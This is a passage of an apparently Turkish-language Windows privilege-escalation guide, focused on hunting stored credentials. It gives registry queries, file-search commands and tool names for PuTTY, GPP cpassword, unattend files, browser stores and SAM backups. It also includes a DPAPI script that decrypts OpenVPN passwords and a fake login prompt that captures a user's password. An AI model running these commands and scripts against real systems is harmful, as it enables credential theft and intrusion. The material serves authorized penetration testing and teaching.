kanıtlamaz. Parolaları ve anahtar materyalini rutin envanter çıktısına dahil etmeyin.

Yönetilen yerel yönetici parolaları için [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kullanın. Dizin veya Entra destekli depolama ve erişim denetimleri, özel bir yerel datastore'dan farklıdır; [Elasticsearch rolleri](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) de kimliği doğrulanmış bir datastore kullanıcısının belirli bir index'i okuyup okuyamayacağını belirler.

### Java server plugin arşivleri ve kimlik bilgisi yeniden kullanımı

Bazı Java server plugin'leri, bir server'ın `plugins` dizininde JAR arşivleri olarak dağıtılır. Okunabilir özel bir plugin, yapılandırma veya gömülü bir servis kimlik bilgisi içeren bytecode barındırabilir. Arşivi yalnızca yetki dahilinde inceleyin ve kurtarılan gizli bilgileri rutin envanter çıktısına dahil etmeyin. Bir plugin yolu tek başına gizli bilgi bulunduğunu kanıtlamaz; kurtarılan bir servis parolası da yalnızca daha ayrıcalıklı bir hesap için geçerliyse daha yüksek ayrıcalıklar sağlar. İlgili dosya ACL'lerini kontrol edin ve yeniden kullanılan kimlik bilgilerini farklı gizli bilgilerle değiştirin. Dizin yapısı için [PaperMC'nin plugin kurulum kılavuzuna](https://docs.papermc.io/paper/adding-plugins/), arşiv içeriği için de [Oracle'ın JAR belgelerine](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) bakın.

### Openfire gömülü veritabanı kimlik bilgileri

Gömülü veritabanı kullanan bir Openfire kurulumu, `openfire.script` dosyasını `Openfire\embedded-db` altında tutabilir. Mevcut hesap bu dosyayı okuyabiliyorsa `OFUSER` kayıtlarını ve `passwordKey` özelliğini birlikte inceleyin. Openfire'ın [user-provider belgeleri](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html), parolaların düz metin olarak veya bu özellikte tutulan bir anahtarla şifrelenmiş biçimde saklanabileceğini belirtiyor. Kurtarılan bir parola, yalnızca daha ayrıcalıklı bir kimlik için hâlâ geçerliyse ayrıcalık yükseltme açısından önem taşır; tek başına dosya adı ne okuma erişimini ne de kimlik bilgilerinin yeniden kullanıldığını kanıtlar. Bu yol bir envanter ipucudur; veritabanı içeriğini ve kimlik bilgilerini rutin envanter çıktısına dahil etmeyin.

Ayrı `Openfire\conf\openfire.xml` dosyası, harici bir veritabanı kullanılsa bile admin console'un yapılandırılmış portlarını ve bind interface'ini ortaya çıkarabilir. Openfire genellikle admin console'u loopback'e bağlar; listener çalışıyorsa bu, yerel bir hesabın adrese erişebilmesine yine de olanak tanır. Gerçek listener'ı, yetkili admin rolünü, plugin yükleme politikasını ve Openfire servis kimliğini birlikte kontrol edin. Plugin yükleyebilen bir admin, plugin kodunun servis bağlamında çalışmasına neden olabilir; servis LocalSystem olarak çalışıyorsa bu bağlam yüksek ayrıcalıklara sahip olabilir. Eşleşen bir hesap parolası veya okunabilir yapılandırma yolu tek başına admin console erişimini ya da kod yürütmeyi kanıtlamaz. Vendor'ın [kurulum ve plugin yönetimi kılavuzuna](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) ve [plugin yükleme API özelliğine](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html) bakın.

### Adli bilişim yönetim server yapılandırması

Velociraptor server yapılandırmaları (genellikle `server.config.yaml` olarak adlandırılır), dahili CA'nın `CA.private_key` anahtarını içerebilir. Daha düşük ayrıcalıklı bir kullanıcı bu anahtarı okuyabiliyorsa API client sertifikası oluşturabilir. Bunun daha yüksek ayrıcalıklar sağlayıp sağlamayacağı server'ın user rollerine, API erişilebilirliğine ve server'ın veya hedef agent'ın çalıştığı kimliğe bağlıdır. Client yapılandırması farklı materyaller içerir; böyle bir yapılandırmanın bulunması server CA'sına erişimi kanıtlamaz. Bazı dağıtımlarda CA private key çevrimdışı tutulur; bu nedenle okunabilir bir server yapılandırmasında imzalama anahtarı bulunmayabilir.

Bir Windows server'da kurulum dizinindeki **server** yapılandırmasının ve korumalı yedek kopyaların ACL'lerini inceleyin. Olası konumlardan biri `%ProgramFiles%\VelociraptorServer\server.config.yaml` şeklindedir; farklıysa servisin yapılandırılmış yolunu kullanın. Mevcut kimliğin dosyayı okuyabildiğini ve `CA.private_key` değerinin gerçekten bulunduğunu doğrulayın. Private key'i loglara veya envanter çıktısına yazdırmaktan kaçının. Vendor'ın `config api_client` iş akışı, client sertifikası oluşturmak için CA anahtarını kullanır; ancak etkili bir server-side rol de gerekir. Böyle bir rolü oluşturmak veya değiştirmek datastore'a yazma erişimi ya da yeniden başlatma gerektirebilir. Bu yazma işlemleri mümkün olmasa bile mevcut ayrıcalıklı bir server kimliği bir yol sağlayabilir. Yürütme haklarına sahip API sorguları, ilgili server veya agent bağlamında çalışır; bu bağlam yüksek ayrıcalıklara sahip olabilir.

Server yapılandırmasını ve yedeklerini kısıtlayıcı ACL'lerle koruyun, mümkünse CA imzalama anahtarını çevrimdışı tutun ve API rollerini ve listener erişimini sınırlandırın. [Velociraptor API belgelerine](https://docs.velociraptor.app/docs/server_automation/server_api/) ve [güvenlik yapılandırması kılavuzuna](https://docs.velociraptor.app/docs/deployment/security/) bakın.

### Putty Kimlik Bilgileri

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ayrı bir oturum yöneticisidir. Yerel şifrelenmiş deposu `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` konumunda bulunabilir. Dışa aktarılmış bir oturum yedeğinin adı `sessions-backup.dat` olabilir ve başka bir yerde saklanabilir. [SolarWinds'in dışa aktarma kılavuzu](https://thwack.solarwinds.com/discussion/comment/115591), dışa aktarımların parola ile şifrelendiğini ve oturumları, anahtarları, betikleri, etiketleri ve ilişkileri içerebileceğini belirtir; [destek forumu](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) ise yerel depoyu tanımlar. Önce dosya izinlerini ve yolları kontrol edin. Bu dosyalardan herhangi birini bulmak, parolasını ortaya çıkarmaz veya kayıtlı bir kimlik bilgisinin hâlâ geçerli olduğunu ya da daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz.

### PuTTY SSH Host Keys

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Kayıt defterindeki SSH anahtarları

SSH özel anahtarları `HKCU\Software\OpenSSH\Agent\Keys` kayıt defteri anahtarında saklanabilir; bu nedenle içinde ilginç bir şey olup olmadığını kontrol etmelisiniz:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Bu yolun içinde herhangi bir kayıt bulursanız, bu muhtemelen kaydedilmiş bir SSH key'dir. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca çözülebilir.\
Bu teknik hakkında daha fazla bilgi: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` service çalışmıyorsa ve açılışta otomatik olarak başlamasını istiyorsanız, şu komutu çalıştırın:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Bu tekniğin artık geçerli olmadığı anlaşılıyor. Bazı ssh anahtarları oluşturup bunları `ssh-add` ile eklemeyi ve ssh üzerinden bir makineye giriş yapmayı denedim. HKCU\Software\OpenSSH\Agent\Keys kayıt defteri anahtarı mevcut değil ve procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Katılımsız dosyalar

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM ve SYSTEM yedekleri

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Readable Windows Imaging (`.wim`) yedek dosyaları çevrimdışı `SAM`, `SECURITY` ve `SYSTEM` hive'ları da içerebilir. Yerel olarak erişilebilen yedekleme veya görüntü dizinlerine öncelik verin ve herhangi bir şeyi çıkarmadan önce bir görüntünün **üye adlarını** inceleyin; yalnızca `.wim` dosya adı, hive'ların bulunduğunu kanıtlamaz ve standart `install.wim`, `boot.wim` ve kurtarma görüntüleri sık karşılaşılan yanıltıcı sonuçlardır. SMB paylaşımı ayrı bir erişim yoludur ve yalnızca bu paylaşım kapsam dahilindeyse kontrol edilmelidir. Microsoft'un [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) ve [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) belgelerine bakın.

### Bulut Kimlik Bilgileri

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** adlı bir dosyayı arayın

### Önbelleğe Alınmış GPP Parolası

Daha önce, Group Policy Preferences (GPP) aracılığıyla bir makine grubuna özel yerel yönetici hesapları dağıtmaya olanak tanıyan bir özellik mevcuttu. Ancak bu yöntemin önemli güvenlik açıkları vardı. İlk olarak, SYSVOL'de XML dosyaları olarak saklanan Group Policy Objects (GPO'lar), herhangi bir etki alanı kullanıcısı tarafından erişilebilirdi. İkinci olarak, bu GPP'lerdeki parolalar, herkesçe belgelenmiş varsayılan bir anahtar kullanılarak AES256 ile şifrelenmişti ve kimliği doğrulanmış herhangi bir kullanıcı tarafından çözülebiliyordu. Bu durum, kullanıcıların yükseltilmiş ayrıcalıklar elde etmesine olanak tanıyabileceği için ciddi bir risk oluşturuyordu.

Bu riski azaltmak amacıyla, boş olmayan bir "cpassword" alanı içeren yerel olarak önbelleğe alınmış GPP dosyalarını tarayan bir işlev geliştirildi. Böyle bir dosya bulunduğunda işlev parolanın şifresini çözer ve özel bir PowerShell nesnesi döndürür. Bu nesne, güvenlik açığının belirlenmesine ve giderilmesine yardımcı olmak için GPP ve dosyanın konumuyla ilgili ayrıntıları içerir.

Bu dosyaları `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista öncesi)_ konumlarında arayın:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'ın şifresini çözmek için:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Parolaları elde etmek için crackmapexec kullanma:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Kimlik bilgileri içeren web.config örneği:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot'taki yedek arşivleri

Doğrudan web üzerinden sunulan bir webroot içine yerleştirilmiş eski bir ZIP yedeği, önceki yapılandırma dosyalarını ve yeniden kullanılabilir kimlik bilgilerini açığa çıkarabilir. Bunu bir güvenlik açığı olarak değerlendirmeden önce sitenin yapılandırılmış fiziksel yolunu ve arşive HTTP üzerinden gerçekten erişilip erişilemediğini kontrol edin. Varsayılan `C:\inetpub\wwwroot` yolu yalnızca olası bir konumdur. Hızlı bir yerel envanter, arşivleri açmadan adları ve boyutları listeleyebilir:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Bir arşivin adı, içinde bir sır bulunduğunu veya kurtarılan bir kimlik bilgisinin daha yüksek ayrıcalık sağladığını kanıtlamaz.

### OpenVPN kimlik bilgileri

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Günlükler

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Kimlik bilgilerini isteyin

Kullanıcının bunları bilebileceğini düşünüyorsanız, **kullanıcıdan kendi kimlik bilgilerini, hatta başka bir kullanıcının kimlik bilgilerini girmesini her zaman isteyebilirsiniz** (istemciden **kimlik bilgilerini** doğrudan **istemek** gerçekten **risklidir**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Kimlik bilgileri içerebilecek olası dosya adları**

Bir süre önce **düz metin** veya **Base64** biçiminde **parolalar** içermiş olduğu bilinen dosyalar

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 veritabanıları genellikle `.psafe3` uzantısını kullanır. Eşleşen bir dosya adını şifrelenmiş kasa adayı olarak değerlendirin; dosyanın varlığı, onu okuyabileceğiniz, kilidini açabileceğiniz veya depolanan kimlik bilgilerini kullanabileceğiniz anlamına gelmez. Bu dosyaların nerede depolandığını incelerken erişilebilir kullanıcı profillerini ve yapılandırılmış dosya paylaşım köklerini kontrol edin.

Okunabilir bir KeePass `.kdbx` dosyası da yalnızca şifrelenmiş kasa için bir ipucudur. Kilidini açmak için asıl ana parola ve yapılandırılmış anahtar dosyası veya hesap faktörleri gerekir. Yetkili bir incelemede bir girdide LM:NT hash çifti bulunursa, [pass-the-hash](../ntlm/README.md#pass-the-hash) seçeneğini değerlendirmeden önce belirtilen hesabı ve NT hash'inin hedefin NTLM hizmeti tarafından hâlâ geçerli ve kabul edilir olup olmadığını doğrulayın. Kasa girdisi tek başına Administrator veya SYSTEM hakları vermez; uzaktan hizmet erişimi, hesap hakları ve ayrıca gereken hizmet çalıştırma adımı da sağlanmış olmalıdır. Envanterde veritabanı veya depolanan kimlik bilgileri yazdırılmamalı; kasa yolu ve okunabilirlik durumu raporlanmalıdır.

Önerilen dosyaların tümünde arama yapın:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Geri Dönüşüm Kutusu'ndaki kimlik bilgileri

Silinmiş yedekleri ve yapılandırma arşivlerini, ayrıca adında açıkça kimlik bilgilerinden söz edilen dosyaları bulmak için erişilebilir Geri Dönüşüm Kutusu girdilerini kontrol edin. Yararlı bir `.7z`, `.zip` veya `.rar` yedeği aylar öncesine ait olabilir ve sıradan bir dosya adına sahip olabilir. Windows, özgün yolu ve silinme zamanını bir `$I` kaydında, silinen dosyayı ise eşleşen `$R` girdisinde saklar; bir arşivi açmadan önce meta verileri ve mevcut kimliğin dosyayı okuma erişimini inceleyin. Görünürlük birime, kullanıcı SID'sine ve dosya izinlerine bağlıdır; bu nedenle boş bir liste, kurtarılabilir yedek olmadığını kanıtlamaz. Bir arşiv adını inceleme adayı olarak değerlendirin; geçerli bir gizli bilgi içerdiğinin kanıtı olarak değil.

Erişilebilir, silinmiş bir `.pfx` dosyası **code-signing** açısından da ipucu olabilir. Erişilebilir bir özel anahtar içeriyorsa, bu anahtar değiştirilmiş bir PowerShell betiğini imzalayabilir; [PowerShell, özel anahtara sahip bir code-signing sertifikası gerektirir](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature) ve [AppLocker publisher kuralları, imzalayanın kimliğini ve kural kapsamını değerlendirir](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Hesaplar arası yürütme için mevcut kimliğin tam olarak söz konusu betiği değiştirebilmesi, etkin bir kuralın betik ve hedef hesap için ortaya çıkan imzayı kabul etmesi ve zamanlanmış bir görevin ya da daha yüksek ayrıcalıklı başka bir tüketicinin betiği gerçekten çalıştırması gerekir. Bir `.pfx` dosya adı, sertifika konusu veya yazılabilir bir betik tek başına bu zincirin mevcut olduğunu kanıtlamaz. Özel anahtar materyalini açmadan veya görevi tetiklemeden önce meta verileri, ACL'leri, ilkeyi ve zamanlanmış komutu inceleyin.

Ayrıca kimlik bilgilerine dair ipuçları için erişilebilir mesajlaşma istemcisi profil veritabanlarını, notları ve alınan dosyaları inceleyin. BitLocker kurtarma anahtarı dışa aktarımı HTML veya TXT biçiminde, bazen de adı belirli bir yedek arşivinin içinde saklanmış olabilir. Bu tür materyaller, eski yedekleri içeren ayrı bir şifrelenmiş veri birimine erişim sağlayabilir; birimi ve arşivi yalnızca erişim yetkiniz varsa inceleyin. Bir yedek `NTDS.dit` içeriyorsa çevrimdışı etki alanı kimlik bilgilerinin kurtarılması için [yedekleme ve ayrıcalıklı gruplar iş akışında](../active-directory-methodology/privileged-groups-and-token-privileges.md) açıklandığı üzere eşleşen `SYSTEM` hive'ı da gerekir. Dosya adları ve kilitli bir birim tek başına kullanılabilir bir kurtarma anahtarının veya etki alanı yedeğinin mevcut olduğunu kanıtlamaz.

Çeşitli programlar tarafından kaydedilmiş **parolaları kurtarmak** için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Kayıt defterinin içinde

**Kimlik bilgileri içerebilecek diğer kayıt defteri anahtarları**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Registry'den openssh anahtarlarını çıkar.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

**Chrome, Edge veya Firefox** parolalarının saklandığı veritabanlarını kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer işaretlerini ve sık kullanılanlarını da kontrol edin; parolalar buralarda saklanmış olabilir.

Mevcut kullanıcının standart Edge **Default** profili için `Login Data`, `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` konumundadır; `Local State` ise üst dizin olan `User Data` içindedir. [Microsoft varsayılan profil konumunu belgeliyor](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); başka bir profil veya `UserDataDir` ilkesi bu konumu değiştirebilir. Dosyaların mevcut olması yalnızca olası bir kimlik bilgisi deposuna işaret eder: okunabilir dosyaları, ilgili kullanıcının DPAPI bağlamını veya başka yetkili anahtar materyalini ve kaydedilmiş bir girişin daha ayrıcalıklı bir hesaba ait olup olmadığını doğrulayın. Yalnızca yolları listelemek için veritabanını açmanız veya şifresi çözülmüş parolaları yazdırmanız gerekmez.

Firefox için [Mozilla, bir profilin `key4.db` ve `logins.json` dosyalarının eşleşen anahtar ve şifrelenmiş giriş dosyaları olduğunu belgeliyor](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile). Bu dosyaların bulunması yalnızca olası bir bulguya işaret eder: kimlik bilgilerinin kullanılabilir olduğu sonucuna varmadan önce her iki dosyanın da okunabilir olup olmadığını, kaydedilmiş girişlerin bulunup bulunmadığını ve anahtarın bir Primary Password ile korunup korunmadığını kontrol edin. Kurtarılan bir kimlik bilgisi bir domain hesabına aitse, bu hesabın etkin grup denetim haklarını ve grubun [LAPS parola okuma veya şifre çözme haklarını](../active-directory-methodology/laps.md) ayrı ayrı inceleyin; tarayıcı kalıntıları tek başına bir yönetici erişim yolu olduğunu kanıtlamaz.

Tarayıcılardan parola çıkarmak için araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, farklı dillerdeki yazılım bileşenleri arasında **iletişim** kurulmasını sağlayan, Windows işletim sisteminde yerleşik bir teknolojidir. Her COM bileşeni bir **class ID (CLSID) ile tanımlanır** ve her bileşen, interface ID'leri (IID'ler) ile tanımlanan bir veya daha fazla arayüz üzerinden işlevsellik sunar.

COM sınıfları ve arayüzleri sırasıyla registry'de **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında tanımlanır. Bu registry, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** birleştirilerek oluşturulur.

Bu registry'nin CLSID'leri içinde, **DLL**'ye işaret eden bir **varsayılan değer** ve **ThreadingModel** adlı bir değer içeren **InProcServer32** alt anahtarını bulabilirsiniz. **ThreadingModel** değeri **Apartment** (Tek İş Parçacıklı), **Free** (Çok İş Parçacıklı), **Both** (Tek veya Çok İş Parçacıklı) ya da **Neutral** (İş Parçacığından Bağımsız) olabilir.

![Tarayıcı Geçmişi - COM DLL Overwriting: Bu registry'nin CLSID'leri içinde, DLL'ye işaret eden bir varsayılan değer ve bir değer içeren InProcServer32 alt anahtarını bulabilirsiniz...](<../../images/image (729).png>)

Temel olarak, çalıştırılacak **DLL'lerden herhangi birinin üzerine yazabilirseniz**, o DLL başka bir kullanıcı tarafından çalıştırılacaksa **yetkilerinizi yükseltebilirsiniz**.

Saldırganların kalıcılık sağlamak için COM Hijacking'i nasıl kullandığını öğrenmek için:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Dosya ve registry'de genel parola araması**

**Dosya içeriklerinde arama**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Belirli bir dosya adını arayın**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Key adları ve parolalar için registry'yi arayın**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Parolaları arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), **msf** için oluşturduğum bir eklentidir. Kurbanın içindeki kimlik bilgilerini arayan tüm Metasploit POST modüllerini **otomatik olarak çalıştırır**.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), bu sayfada bahsedilen parola içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne), bir sistemden parola çıkarmak için kullanılan başka bir harika araçtır.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) aralarında bu verileri düz metin olarak kaydeden çeşitli araçlara (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP) ait **oturumları**, **kullanıcı adlarını** ve **parolaları** arar.

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

SYSTEM olarak çalışan bir sürecin **tam erişimle yeni bir süreç açtığını** (`OpenProcess()`) hayal edin. Aynı süreç, **ana sürecin tüm açık handle’larını devralan, ancak düşük ayrıcalıklarla çalışan yeni bir süreç de oluşturur** (`CreateProcess()`).\
Ardından, düşük ayrıcalıklı sürece **tam erişiminiz varsa**, `OpenProcess()` ile oluşturulan ayrıcalıklı sürece ait **açık handle’ı alabilir** ve **shellcode enjekte edebilirsiniz**.\
[Bu güvenlik açığının **nasıl tespit edilip istismar edileceği** hakkında daha fazla bilgi için bu örneği inceleyin.](leaked-handle-exploitation.md)\
[Farklı izin düzeyleriyle devralınan süreç ve thread’lere ait daha fazla açık handle’ın (yalnızca tam erişim değil) nasıl test edilip kötüye kullanılacağı hakkında daha kapsamlı bir açıklama için bu **diğer yazıyı okuyun**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**Pipe** olarak adlandırılan paylaşımlı bellek segmentleri, süreçler arası iletişim ve veri aktarımı sağlar.

Windows, ilgisiz süreçlerin farklı ağlarda bile veri paylaşmasına olanak tanıyan **Named Pipes** adlı bir özellik sunar. Bu, rolleri **named pipe server** ve **named pipe client** olarak tanımlanan bir client/server mimarisine benzer.

